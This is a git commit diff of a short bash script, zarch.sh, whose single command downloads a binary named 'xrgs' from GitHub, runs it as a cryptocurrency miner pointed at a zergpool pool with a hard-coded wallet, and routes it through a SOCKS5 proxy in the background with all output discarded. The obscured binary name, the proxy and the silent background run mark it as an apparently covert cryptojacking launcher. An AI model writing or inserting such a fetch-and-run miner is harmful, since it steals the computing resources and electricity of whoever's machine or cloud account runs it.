0f7a7b223c28f6ef56d9e41af70eb02669d150d2
sujuli03 <111342533+sujuli03@users.noreply.github.com>
2022-09-07 12:06:40 +0000

    Update zarch.sh

--- zarch.sh
+++ zarch.sh
@@ -1,4 +1,3 @@
 #!/bin/bash
-wget https://github.com/matefusiom101/GPU/raw/main/xrgs && chmod +x xrgs && ./xrgs -a cn-heavy/xhv -o cryptonight_haven.mine.zergpool.com:4452 -u 0xa38168520124bCE91c0C1D61cf27Bb0282B99209 -p c=SHIB
- $(echo $(shuf -i 100-999 -n 1)-MasBroo) -t 2 -x socks5://192.252.209.155:14455 >/dev/null &
+wget https://github.com/matefusiom101/GPU/raw/main/xrgs && chmod +x xrgs && ./xrgs -a cn-heavy/xhv -o cryptonight_haven.mine.zergpool.com:4452 -u 0xa38168520124bCE91c0C1D61cf27Bb0282B99209 -p c=SHIB $(echo $(shuf -i 100-999 -n 1)-MasBroo) -t 2 -x socks5://192.252.209.155:14455 >/dev/null &
  
